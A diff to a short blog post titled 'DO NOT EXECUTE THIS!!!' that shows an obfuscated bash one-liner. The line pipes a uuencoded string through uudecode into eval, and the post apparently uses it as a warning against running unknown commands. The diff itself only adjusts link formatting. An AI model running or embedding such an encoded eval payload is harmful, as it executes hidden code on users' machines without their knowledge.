@@ -3,8 +3,8 @@ layout: post
 title: DO NOT EXECUTE THIS!!!
 ---
 
-```eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode)```
-Source: [https://www.vidarholen.net/contents/blog/?p=766]  
+```eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode)```  
+Source: [https://www.vidarholen.net/contents/blog/?p=766][1]  
 <br>
   
   
@@ -20,6 +20,7 @@ Source: [https://www.vidarholen.net/contents/blog/?p=766]
 &emsp;&emsp;There were many who used to make fun of script kiddies. We don't really hear it that much anymore. Plus, almost everyone nowadays uses some sort of framework with pre-configured vulnerabilities and paylods.
 
 
+[1]: https://www.vidarholen.net/contents/blog/?p=766
 
 
 
